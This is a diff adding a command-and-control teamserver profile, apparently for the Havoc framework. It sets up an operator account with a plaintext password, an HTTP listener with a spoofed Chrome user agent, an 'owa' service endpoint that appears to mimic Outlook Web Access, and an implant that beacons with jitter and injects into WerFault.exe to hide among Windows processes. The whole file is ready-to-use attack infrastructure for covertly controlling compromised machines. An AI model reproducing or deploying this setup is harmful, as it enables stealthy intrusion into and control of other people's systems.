@@ -1,0 +1,42 @@
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 443
+    Build {
+        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+Operators {
+    user "proc" {
+        Password = "mdp2PR0C"
+    }
+}
+Listeners {
+        Http {
+                Name         = "http"
+                Hosts        = ["YOUR PUBLIC IP ADDRESS"]
+                HostBind     = "0.0.0.0"
+                HostRotation = "round-robin"
+                PortBind     = 80
+                PortConn     = 80
+                Secure       = false
+                UserAgent    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+        }
+        External {
+                Name            = "kikikiiiii"
+                Endpoint        = "kikikiiiii"
+        }
+}
+Service {
+    Endpoint = "owa"
+    Password = "NotifyEmailSync"
+}
+Demon {
+    Sleep = 2
+    Jitter = 15
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\WerFault.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\WerFault.exe"
+    }
+}
